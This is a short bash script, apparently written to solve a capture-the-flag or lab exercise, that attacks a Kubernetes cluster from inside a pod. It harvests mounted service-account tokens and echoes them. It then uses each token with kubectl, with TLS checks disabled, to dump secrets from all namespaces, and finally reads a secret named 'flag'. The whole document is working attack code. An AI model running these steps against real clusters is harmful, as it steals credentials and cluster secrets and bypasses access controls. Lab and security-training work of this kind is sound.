#!/bin/bash

# Tries all the token found to access kube-api
# Tries to get the secrets using each token
for path in $(mount | grep kube-api | awk '{print $3}'); do TOKEN=$(cat $path/token); echo $TOKEN; ./kubectl --server=https://$KUBERNETES_SERVICE_HOST --token=$TOKEN --insecure-skip-tls-verify=true get secrets -A; done

# Two tokens should work the ingress controller service account and the busybox service account 
./kubectl --server=https://$KUBERNETES_SERVICE_HOST --token=$TOKEN --insecure-skip-tls-verify=true get secrets flag -o json